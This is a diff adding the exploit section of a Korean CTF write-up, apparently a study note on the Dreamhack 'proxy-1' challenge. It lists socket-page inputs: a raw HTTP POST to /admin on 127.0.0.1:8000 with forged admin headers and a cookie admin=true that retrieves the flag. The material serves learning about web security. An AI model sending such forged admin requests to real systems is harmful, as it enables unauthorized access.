@@ -99,3 +99,13 @@ socket 페이지에서 이용자의 입력값에 대한 어떠한 검증도 하�
 <br/><br/>
 
 ### 익스플로잇
+socket 페이지에서 host, port, Data에 아래와 같이 입력하고 [Send] 버튼을 클릭하면 플래그를 획득할 수 있음
+<br/><br/>
+<img width="2560" alt="proxy-1_익스플로잇" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/ac86df3b-9c03-4c11-9c52-3a83b09851ae"><br/>
+
+* socket 페이지의 각 항목의 입력값
+    | 항목 | 입력값 |
+    |:---:|------|
+    | host | 127.0.0.1 |
+    | port | 8000 |
+    | Data | POST /admin HTTP/1.1 <br/> Host: 127.0.0.1 <br/> User-Agent: Admin Browswer <br/> DremahackUser: admin <br/> Cookie: admin=true <br/> Content-Type: application/x-www-form-urlencoded <br/> Content-Length: 12 <br/><br/> userid=admin |
